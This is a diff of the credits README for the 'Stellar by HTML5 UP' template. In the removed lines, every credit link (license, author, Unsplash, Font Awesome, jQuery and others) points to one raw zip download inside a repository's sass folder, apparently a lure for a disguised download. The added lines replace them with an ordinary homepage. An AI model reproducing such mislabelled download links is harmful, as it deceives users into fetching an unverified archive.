@@ -1,6 +1,6 @@
 Stellar by HTML5 UP
-https://github.com/FilipStanic/Keyframes-Css/raw/refs/heads/master/assets/sass/components/Keyframes_Css_1.7.zip | @ajlkn
-Free for personal and commercial use under the CCA 3.0 license (https://github.com/FilipStanic/Keyframes-Css/raw/refs/heads/master/assets/sass/components/Keyframes_Css_1.7.zip)
+https://filipstanic.github.io | @ajlkn
+Free for personal and commercial use under the CCA 3.0 license (https://filipstanic.github.io)
 
 
 Say hello to Stellar, a slick little one-pager with a super vibrant color palette (which
@@ -14,18 +14,18 @@ you can use for pretty much whatever.
 (* = not included)
 
 AJ
-https://github.com/FilipStanic/Keyframes-Css/raw/refs/heads/master/assets/sass/components/Keyframes_Css_1.7.zip | @ajlkn
+https://filipstanic.github.io | @ajlkn
 
 
 Credits:
 
 	Demo Images:
-		Unsplash (https://github.com/FilipStanic/Keyframes-Css/raw/refs/heads/master/assets/sass/components/Keyframes_Css_1.7.zip)
+		Unsplash (https://filipstanic.github.io)
 
 	Icons:
-		Font Awesome (https://github.com/FilipStanic/Keyframes-Css/raw/refs/heads/master/assets/sass/components/Keyframes_Css_1.7.zip)
+		Font Awesome (https://filipstanic.github.io)
 
 	Other:
-		jQuery (https://github.com/FilipStanic/Keyframes-Css/raw/refs/heads/master/assets/sass/components/Keyframes_Css_1.7.zip)
-		Scrollex (https://github.com/FilipStanic/Keyframes-Css/raw/refs/heads/master/assets/sass/components/Keyframes_Css_1.7.zip)
-		Responsive Tools (https://github.com/FilipStanic/Keyframes-Css/raw/refs/heads/master/assets/sass/components/Keyframes_Css_1.7.zip)
+		jQuery (https://filipstanic.github.io)
+		Scrollex (https://filipstanic.github.io)
+		Responsive Tools (https://filipstanic.github.io)
